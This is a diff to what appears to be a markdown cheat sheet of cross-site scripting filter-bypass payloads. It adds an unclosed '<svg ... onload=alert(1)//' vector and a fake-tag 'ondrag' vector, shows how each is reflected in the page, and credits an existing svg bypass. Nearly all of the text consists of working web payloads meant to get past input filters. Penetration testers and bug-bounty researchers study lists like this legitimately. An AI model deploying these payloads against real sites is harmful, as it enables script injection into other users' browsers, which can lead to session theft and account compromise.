@@ -42,9 +42,12 @@ For Attribute context use:
 
 `<svg/oni=on onload=confirm(2)>` Credits for XSS bypass in HTML context: [Troll_13](https://twitter.com/Troll_13/status/1353713311972552709)
 
-* When `>` is not allowed as its allowed in previous payloads, inexistent tag can be provided for xss:
+* When `>` is present somewhere after our payload in response page:
 
-`<o oni=on ondrag=alert(1)>Drag Me` -> then highlight text and drag it to trigger XSS (Crafted on `February 01, 2022`)
+`<svg oni=on onload=alert(1)//` e.g reflected as `<svg oni=on onload=alert(1)//</h2>` (Crafted on `February 01, 2022`)
+* Situation: No `>` is present after our payload anywhere in response body and at the same time when `>` is not allowed as its allowed in previous payloads, inexistent tag can be provided for xss:
+
+`<o oni=on ondrag=alert(1)>Drag Me` e.g reflected as `<o oni=on ondrag=alert(1)>Drag Me no left angle bracket present here` -> then highlight text and drag it to trigger XSS (Crafted on `February 01, 2022`)
 
 
 ---
